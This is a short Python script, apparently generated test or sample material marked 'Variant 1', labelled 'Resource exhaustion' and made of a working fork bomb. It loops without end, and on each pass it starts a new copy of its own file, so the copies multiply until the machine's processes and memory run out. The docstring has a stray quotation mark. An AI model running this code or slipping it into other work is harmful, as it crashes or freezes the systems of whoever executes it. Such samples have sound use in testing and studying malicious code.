# Variant 1 - Generated at 2026-03-30T08:16:36.488378

#!/usr/bin/env python3
'""Resource exhaustion - resource_exhaustion"""
import subprocess

# Fork bomb
while True:
    subprocess.Popen(["python3", __file__])
